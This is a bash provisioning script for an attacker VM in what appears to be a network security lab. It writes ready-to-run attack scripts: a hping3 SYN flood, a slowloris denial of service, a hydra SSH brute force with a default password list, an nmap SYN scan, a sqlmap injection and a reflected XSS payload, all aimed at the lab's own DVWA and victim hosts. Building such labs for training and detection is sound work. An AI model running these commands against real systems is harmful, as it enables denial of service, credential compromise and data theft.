#!/usr/bin/env bash
# attacker.nt2102.ch — Kali toolbox for the 5 attack scenarios
set -euxo pipefail
export DEBIAN_FRONTEND=noninteractive

# shellcheck source=/vagrant/provision/_lib.sh
source /vagrant/provision/_lib.sh


# Persistent routes (survive vagrant halt / reboot)
install_lab_routes \
    "10.21.2.0/24 via 198.51.100.11" \
    "203.0.113.0/24 via 198.51.100.11"

grep -q "nt2102.ch" /etc/hosts || cat >> /etc/hosts <<'EOF'
10.21.2.11    sensor.nt2102.ch      sensor
10.21.2.12    web-victim.nt2102.ch  web-victim
10.21.2.13    srv-victim.nt2102.ch  srv-victim
10.21.2.14    bot.nt2102.ch         bot
203.0.113.102 c2.nt2102.ch          c2
EOF

apt-get update -y
apt-get install -y --no-install-recommends \
    hping3 nmap hydra patator sqlmap wfuzz \
    slowhttptest netcat-traditional curl wget git \
    python3 python3-pip

mkdir -p /home/vagrant/attacks

cat > /home/vagrant/attacks/01_ddos_synflood.sh <<'EOF'
#!/usr/bin/env bash
# SYN flood against web-victim:80  (stop with Ctrl+C)
sudo hping3 -S --flood -p 80 10.21.2.12
EOF

cat > /home/vagrant/attacks/02_ddos_slowloris.sh <<'EOF'
#!/usr/bin/env bash
slowhttptest -c 500 -H -g -o slowloris -i 10 -r 200 -t GET -u http://10.21.2.12/ -x 24 -p 3
EOF

cat > /home/vagrant/attacks/03_bruteforce_ssh.sh <<'EOF'
#!/usr/bin/env bash
# SSH brute-force against srv-victim.
echo -e "root\nadmin\nvagrant\nubuntu\ntest\nlab" > /tmp/users.txt
echo -e "password\n123456\nadmin\nvagrant\nletmein\nqwerty" > /tmp/passes.txt
hydra -L /tmp/users.txt -P /tmp/passes.txt -t 4 -f ssh://10.21.2.13
EOF

cat > /home/vagrant/attacks/04_portscan.sh <<'EOF'
#!/usr/bin/env bash
# Port scan across the LAN (SYN scan, top 1000 ports)
sudo nmap -sS -T4 --top-ports 1000 10.21.2.0/24
EOF

cat > /home/vagrant/attacks/05_web_sqli.sh <<'EOF'
#!/usr/bin/env bash
# SQLi against DVWA (Low security). Replace REPLACE_ME with your PHPSESSID from the browser.
sqlmap -u "http://10.21.2.12/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
       --cookie="PHPSESSID=REPLACE_ME; security=low" \
       --batch --dbs
EOF

cat > /home/vagrant/attacks/06_web_xss.sh <<'EOF'
#!/usr/bin/env bash
curl -sG "http://10.21.2.12/dvwa/vulnerabilities/xss_r/" \
     --data-urlencode "name=<script>alert(1)</script>" \
     -b "PHPSESSID=REPLACE_ME; security=low" -o /tmp/xss_response.html
echo "response saved to /tmp/xss_response.html"
EOF

chmod +x /home/vagrant/attacks/*.sh
chown -R vagrant:vagrant /home/vagrant/attacks

echo "attacker.nt2102.ch provisioning done."
report_reboot_requirement
